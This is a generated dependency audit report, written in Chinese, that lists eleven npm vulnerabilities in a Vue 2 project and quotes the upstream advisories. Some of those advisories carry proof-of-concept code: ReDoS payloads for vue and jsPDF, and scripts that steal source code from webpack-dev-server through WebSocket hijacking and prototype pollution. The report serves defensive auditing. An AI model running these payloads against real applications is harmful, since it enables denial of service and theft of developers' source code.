# 安全依赖审计报告

**生成时间**: 2025/12/29 15:56:04
**审计工具**: pnpm audit

## 统计概览

### 漏洞统计

| 严重程度 | 数量 |
|---------|------|
| 严重 (Critical) | 0 |
| 高危 (High) | 5 |
| 中危 (Moderate) | 5 |
| 低危 (Low) | 1 |
| 信息 (Info) | 0 |

**总漏洞数**: 11

### 依赖统计

- **生产依赖**: 1020
- **开发依赖**: 0
- **可选依赖**: 0
- **总依赖数**: 1020


## 漏洞详情

### vue-template-compiler vulnerable to client-side Cross-Site Scripting (XSS)

**模块**: `vue-template-compiler`
**严重程度**: 🟡 中危
**CVE**: [CVE-2024-6783](https://github.com/advisories/GHSA-g3ch-rx76-35fx)
**受影响版本**: `>=2.0.0 <3.0.0`
**推荐版本**: `>=3.0.0`

**概述**:
A vulnerability has been discovered in vue-template-compiler, that allows an attacker to perform XSS via prototype pollution. The attacker could change the prototype chain of some properties such as `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary JavaScript code. Vue 2 has reached End-of-Life. This vulnerability has been patched in Vue 3.

**受影响路径**:
- `.>vue-template-compiler` (2.7.16)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2024-6783
- https://www.herodevs.com/vulnerability-directory/cve-2024-6783
- https://github.com/advisories/GHSA-g3ch-rx76-35fx

**CVSS评分**: 4.2 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)

---



### ReDoS vulnerability in vue package that is exploitable through inefficient regex evaluation in the parseHTML function

**模块**: `vue`
**严重程度**: 🟢 低危
**CVE**: [CVE-2024-9506](https://github.com/advisories/GHSA-5j4c-8p2g-v4jx)
**受影响版本**: `>=2.0.0-alpha.1 <3.0.0-alpha.0`
**推荐版本**: `>=3.0.0-alpha.0`

**概述**:
The ReDoS can be exploited through the `parseHTML` function in the `html-parser.ts` file. This flaw allows attackers to slow down the application by providing specially crafted input that causes inefficient processing of regular expressions, leading to excessive resource consumption.

To demonstrate this vulnerability, here's an example. In a Vue client-side application, create a new Vue instance with a template string that includes a `<script>` tag but closes it incorrectly with something like `</textarea>`.

```javascript
new Vue({
  el: '#app',
  template: '
    <div>
      Hello, world!
      <script>${'<'.repeat(1000000)}</textarea>
    </div>'
});
```
Next, set up a basic HTML page (e.g., index.html) to load this JavaScript and mount the Vue instance:

```html
<!DOCTYPE html>
<html>
<head>
  <title>My first Vue app</title>
</head>
<body>
  <div id=\"app\">Loading...</div>
</body>
</html>
```

When you visit the app in your browser at http://localhost:3000, you'll notice that the time taken to parse and mount the Vue application increases significantly due to the ReDoS vulnerability, demonstrating how the flaw can affect performance.

**受影响路径**:
- `.>vue` (2.7.16)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2024-9506
- https://www.herodevs.com/vulnerability-directory/cve-2024-9506
- https://github.com/advisories/GHSA-5j4c-8p2g-v4jx

**CVSS评分**: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)

---



### jsPDF Bypass Regular Expression Denial of Service (ReDoS)

**模块**: `jspdf`
**严重程度**: 🟠 高危
**CVE**: [CVE-2025-29907](https://github.com/advisories/GHSA-w532-jxjh-hjhj)
**受影响版本**: `<3.0.1`
**推荐版本**: `>=3.0.1`

**概述**:
### Impact
User control of the first argument of the `addImage` method results in CPU utilization and denial of service.

If given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.

Other affected methods are: `html`, `addSvgAsImage`.

Example payload:
```js
import { jsPDF } from "jpsdf" 

const doc = new jsPDF();
const payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\x00base64,undefined';

const startTime = performance.now()

try {
 doc.addImage(payload, "PNG", 10, 40, 180, 180, undefined, "SLOW");
} catch (err) {
  const endTime = performance.now()
  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)
}

doc.save("a4.pdf");
```

### Patches
The vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@>=3.0.1

### Workarounds
Sanitize image urls before passing it to the `addImage` method or one of the other affected methods.

### Credits
Researcher: Aleksey Solovev (Positive Technologies)

**受影响路径**:
- `.>jspdf` (2.5.2)

**参考链接**:
- https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj
- https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df
- https://nvd.nist.gov/vuln/detail/CVE-2025-29907
- https://github.com/advisories/GHSA-w532-jxjh-hjhj

**CVSS评分**: 0 ()

---



### Regular Expression Denial of Service (ReDoS) in cross-spawn

**模块**: `cross-spawn`
**严重程度**: 🟠 高危
**CVE**: [CVE-2024-21538](https://github.com/advisories/GHSA-3xgq-45jj-v275)
**受影响版本**: `<6.0.6`
**推荐版本**: `>=6.0.6`

**概述**:
Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

**受影响路径**:
- `.>@vue/cli-plugin-eslint>yorkie>execa>cross-spawn` (5.1.0)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2024-21538
- https://github.com/moxystudio/node-cross-spawn/pull/160
- https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff
- https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f
- https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230
- https://github.com/moxystudio/node-cross-spawn/issues/165
- https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd
- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349
- https://github.com/advisories/GHSA-3xgq-45jj-v275

**CVSS评分**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

---



### DOMPurify allows Cross-site Scripting (XSS)

**模块**: `dompurify`
**严重程度**: 🟡 中危
**CVE**: [CVE-2025-26791](https://github.com/advisories/GHSA-vhxf-7vqr-mrjg)
**受影响版本**: `<3.2.4`
**推荐版本**: `>=3.2.4`

**概述**:
DOMPurify before 3.2.4 has an incorrect template literal regular expression when SAFE_FOR_TEMPLATES is set to true, sometimes leading to mutation cross-site scripting (mXSS).

**受影响路径**:
- `.>jspdf>dompurify` (2.5.8)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2025-26791
- https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02
- https://ensy.zip/posts/dompurify-323-bypass
- https://github.com/cure53/DOMPurify/releases/tag/3.2.4
- https://nsysean.github.io/posts/dompurify-323-bypass
- https://github.com/advisories/GHSA-vhxf-7vqr-mrjg

**CVSS评分**: 4.5 (CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N)

---



### jsPDF Denial of Service (DoS)

**模块**: `jspdf`
**严重程度**: 🟠 高危
**CVE**: [CVE-2025-57810](https://github.com/advisories/GHSA-8mvj-3j78-4qmw)
**受影响版本**: `<=3.0.1`
**推荐版本**: `>=3.0.2`

**概述**:
### Impact
User control of the first argument of the addImage method results in CPU utilization and denial of service.

If given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.

Other affected methods are: `html`.

Example payload:

```js
import { jsPDF } from "jspdf" 

const payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])

const doc = new jsPDF();
const startTime = performance.now();
try {
  doc.addImage(payload, "PNG", 10, 40, 180, 180, undefined, "SLOW");
} finally {
  const endTime = performance.now();
  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);
}
```

### Patches
The vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.

In jspdf@>=3.0.2, invalid PNG files throw an Error instead of causing very long running loops.

### Workarounds
Sanitize image data or URLs before passing it to the addImage method or one of the other affected methods.

### Credits
Researcher: Aleksey Solovev (Positive Technologies)

**受影响路径**:
- `.>jspdf` (2.5.2)

**参考链接**:
- https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw
- https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9
- https://nvd.nist.gov/vuln/detail/CVE-2025-57810
- https://github.com/parallax/jsPDF/pull/3880
- https://github.com/parallax/jsPDF/releases/tag/v3.0.2
- https://github.com/advisories/GHSA-8mvj-3j78-4qmw

**CVSS评分**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

---



### Prototype Pollution in sheetJS

**模块**: `xlsx`
**严重程度**: 🟠 高危
**CVE**: [CVE-2023-30533](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)
**受影响版本**: `<0.19.3`
**推荐版本**: `<0.0.0`

**概述**:
All versions of SheetJS CE through 0.19.2 are vulnerable to "Prototype Pollution" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.

A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.19.3 can be downloaded via https://cdn.sheetjs.com/.

**受影响路径**:
- `.>xlsx` (0.18.5)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2023-30533
- https://cdn.sheetjs.com/advisories/CVE-2023-30533
- https://git.sheetjs.com/sheetjs/sheetjs/src/branch/master/CHANGELOG.md
- https://git.sheetjs.com/sheetjs/sheetjs/issues/2667
- https://git.sheetjs.com/sheetjs/sheetjs/issues/2986
- https://cdn.sheetjs.com
- https://github.com/advisories/GHSA-4r6h-8v6p-xvw6

**CVSS评分**: 7.8 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

---



### SheetJS Regular Expression Denial of Service (ReDoS)

**模块**: `xlsx`
**严重程度**: 🟠 高危
**CVE**: [CVE-2024-22363](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)
**受影响版本**: `<0.20.2`
**推荐版本**: `<0.0.0`

**概述**:
SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).

A non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.20.2 can be downloaded via https://cdn.sheetjs.com/.

**受影响路径**:
- `.>xlsx` (0.18.5)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2024-22363
- https://cdn.sheetjs.com/advisories/CVE-2024-22363
- https://cwe.mitre.org/data/definitions/1333.html
- https://git.sheetjs.com/sheetjs/sheetjs/src/tag/v0.20.2
- https://cdn.sheetjs.com
- https://github.com/advisories/GHSA-5pgg-2g8v-p4x9

**CVSS评分**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

---



### webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser

**模块**: `webpack-dev-server`
**严重程度**: 🟡 中危
**CVE**: [CVE-2025-30360](https://github.com/advisories/GHSA-9jgg-88mc-972h)
**受影响版本**: `<=5.2.0`
**推荐版本**: `>=5.2.1`

**概述**:
### Summary
Source code may be stolen when you access a malicious web site with non-Chromium based browser.

### Details
The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.
But webpack-dev-server always allows IP address `Origin` headers.
https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127
This allows websites that are served on IP addresses to connect WebSocket.
By using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.

related commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.

This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)
5. Edit `src/index.js` in the extracted directory
6. You can see the content of `src/index.js`

![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)

The script in the POC site is:
```js
window.webpackHotUpdate = (...args) => {
    console.log(...args);
    for (i in args[1]) {
        document.body.innerText = args[1][i].toString() + document.body.innerText
	    console.log(args[1][i])
    }
}

let params = new URLSearchParams(window.location.search);
let target = new URL(params.get('target') || 'http://127.0.0.1:8080');
let file = params.get('file')
let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';
let wsPort = target.port;
var currentHash = '';
var currentHash2 = '';
let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;
ws = new WebSocket(wsTarget);
ws.onmessage = event => {
    console.log(event.data);
    if (event.data.match('"type":"ok"')) {
        s = document.createElement('script');
        s.src = `${target}${file}.${currentHash2}.hot-update.js`;
        document.body.appendChild(s)
    }
    r = event.data.match(/"([0-9a-f]{20})"/);
    if (r !== null) {
        currentHash2 = currentHash;
        currentHash = r[1];
        console.log(currentHash, currentHash2);
    }
}
```

### Impact
This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.

**受影响路径**:
- `.>@vue/cli-service>webpack-dev-server` (4.15.2)

**参考链接**:
- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h
- https://nvd.nist.gov/vuln/detail/CVE-2025-30360
- https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb
- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239
- https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127
- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e
- https://github.com/advisories/GHSA-9jgg-88mc-972h

**CVSS评分**: 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

---



### webpack-dev-server users' source code may be stolen when they access a malicious web site

**模块**: `webpack-dev-server`
**严重程度**: 🟡 中危
**CVE**: [CVE-2025-30359](https://github.com/advisories/GHSA-4v9v-hfq4-rm2v)
**受影响版本**: `<=5.2.0`
**推荐版本**: `>=5.2.1`

**概述**:
### Summary
Source code may be stolen when you access a malicious web site.

### Details
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src="http://localhost:8080/main.js">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.
By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`
5. You can see the source code output in the document and the devtools console.

![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)

The script in the POC site is:
```js
let moduleList
const onHandlerSet = (handler) => {
  console.log('h', handler)
  moduleList = handler.require.m
}

const originalArrayForEach = Array.prototype.forEach
Array.prototype.forEach = function forEach(callback, thisArg) {
  callback((handler) => {
    onHandlerSet(handler)
  })
  originalArrayForEach.call(this, callback, thisArg)
  Array.prototype.forEach = originalArrayForEach
}

const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () => {
  console.log(moduleList)
  for (const key in moduleList) {
    const p = document.createElement('p')
    const title = document.createElement('strong')
    title.textContent = key
    const code = document.createElement('code')
    code.textContent = moduleList[key].toString()
    p.append(title, ':', document.createElement('br'), code)
    document.body.appendChild(p)
  }
})
document.head.appendChild(script)
```

This script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).
```js
    // The require function
    function __webpack_require__(moduleId) {
        // Check if module is in cache
        var cachedModule = __webpack_module_cache__[moduleId];
        if (cachedModule !== undefined) {
            return cachedModule.exports;
        }
        // Create a new module (and put it into the cache)
        var module = __webpack_module_cache__[moduleId] = {
            // no module.id needed
            // no module.loaded needed
            exports: {}
        };
        // Execute the module function
        var execOptions = {
            id: moduleId,
            module: module,
            factory: __webpack_modules__[moduleId],
            require: __webpack_require__
        };
        __webpack_require__.i.forEach(function(handler) {
            handler(execOptions);
        });
        module = execOptions.module;
        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);
        // Return the exports of the module
        return module.exports;
    }
```
Especially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.
It uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.

### Impact
This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.

<details>
<summary>Old content</summary>

### Summary
Source code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.

### Details
When `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src="http://localhost:8080/main.js">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.
By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

I pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`
5. Open the devtools console.
6. You can see the content of `src/index.js` and other scripts loaded.

![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)

The script in the POC site is:
```js
const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () => {
    for (const module in window.__webpack_modules__) {
        console.log(`${module}:`, window.__webpack_modules__[module].toString())
    }
})
document.head.appendChild(script)
```

### Impact
This vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.

</details>

**受影响路径**:
- `.>@vue/cli-service>webpack-dev-server` (4.15.2)

**参考链接**:
- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v
- https://nvd.nist.gov/vuln/detail/CVE-2025-30359
- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e
- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239
- https://github.com/advisories/GHSA-4v9v-hfq4-rm2v

**CVSS评分**: 5.3 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N)

---



### PostCSS line return parsing error

**模块**: `postcss`
**严重程度**: 🟡 中危
**CVE**: [CVE-2023-44270](https://github.com/advisories/GHSA-7fh5-64p2-3v2j)
**受影响版本**: `<8.4.31`
**推荐版本**: `>=8.4.31`

**概述**:
An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\r` discrepancies, as demonstrated by `@font-face{ font:(\r/*);}` in a rule.

This vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.

**受影响路径**:
- `.>@vue/cli-service>@vue/component-compiler-utils>postcss` (7.0.39)

**参考链接**:
- https://nvd.nist.gov/vuln/detail/CVE-2023-44270
- https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5
- https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25
- https://github.com/postcss/postcss/releases/tag/8.4.31
- https://github.com/github/advisory-database/issues/2820
- https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html
- https://github.com/advisories/GHSA-7fh5-64p2-3v2j

**CVSS评分**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)

---




## 建议操作

### 建议操作

{{#each actions}}
#### {{actionType}} 操作

**模块**: `{{module}}`
**目标版本**: {{#if target}}`{{target}}`{{/if}}
**深度**: {{depth}}

**受影响的依赖路径**:
{{#each resolves}}
- `{{path}}` (ID: {{id}})
{{/each}}

{{/each}}

